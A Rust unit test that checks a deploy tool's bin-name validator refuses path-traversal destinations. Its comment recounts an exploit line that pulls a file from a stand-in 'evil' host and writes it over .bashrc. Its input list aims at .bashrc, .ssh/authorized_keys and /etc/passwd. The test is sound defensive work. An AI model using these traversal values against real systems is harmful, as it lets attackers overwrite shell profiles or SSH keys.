use super::*;

#[test]
fn a_traversing_bin_name_is_refused() {
    // SEC1's exploit, one pasted line: `web:http://evil/x @bin=../../.bashrc` resolved to
    // the home directory and the deploy replaced the shell profile with a symlink to the
    // downloaded file. HTTPS and a matching checksum do not touch this — the traversal is
    // in the destination.
    for bad in [
        "../../.bashrc",
        "../.ssh/authorized_keys",
        r"..\..\x",
        // Not a traversal on either platform, and refused on both anyway: the rule is a
        // property of the text, so a manifest means the same thing wherever it is read.
        r"a\b",
        r"\server\share",
        "sub/dir",
        "..",
        ".",
        "",
        "/etc/passwd",
    ] {
        assert!(
            bin_destination(&dir(), bad, true).is_err(),
            "`{}` must be refused",
            bad
        );
    }
}
